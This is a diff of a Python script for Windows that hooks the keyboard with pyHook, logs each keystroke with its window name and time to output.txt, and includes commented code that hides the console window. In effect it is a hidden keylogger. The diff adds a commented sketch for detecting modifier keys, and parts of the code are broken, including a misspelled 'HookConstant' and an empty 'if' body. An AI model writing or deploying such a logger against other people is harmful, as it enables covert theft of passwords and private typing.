@@ -3,6 +3,8 @@ import win32console
 import win32gui
 import pythoncom, pyHook
 import processing as p
+from pyHook.HookManager import HookConstants
+
 '''
 win = win32console.GetConsoleWindow()
 win32gui.ShowWindow(win, 0) //3 for max size
@@ -29,10 +31,19 @@ win32gui.ShowWindow(win, 0) //3 for max size
     print '---'
 
 '''
+
+''' # Possible to check for specific controls
+def OnKeyboardEvent(event):
+    ctrl_pressed = HookManager.GetKeyState(HookConstants.VKeyToID('VK_CONTROL'))
+    if ctrl_pressed and HookConstant.IDToName(event.keyId) == 'c': 
+        # process ctrl-c
+
+    shift_pressed = pyHook.GetKeyState(HookConstants.VKeyToID('VK_LSHIFT'))
+    print(shift_pressed)
+'''
 def OnKeyboardEvent(event):
     data = (event.WindowName, event.Window, event.Time, event.Ascii, event.Key, event.Alt, event.KeyID)
-    print(data)
-    print(chr(event.KeyID))
+    print(event.KeyID)  
 
     # open output.txt to read current keystrokes
     f = open('output.txt', 'r+')
@@ -49,10 +60,6 @@ def OnKeyboardEvent(event):
     f.write(buffer)
     f.close()
     return 0
-    '''
-    if (event.Ascii > 31 and event.Ascii < 127) or event.Ascii == 13 or event.Ascii == 9:
-    '''
-
 
 # create a hook manager object
 hm = pyHook.HookManager()
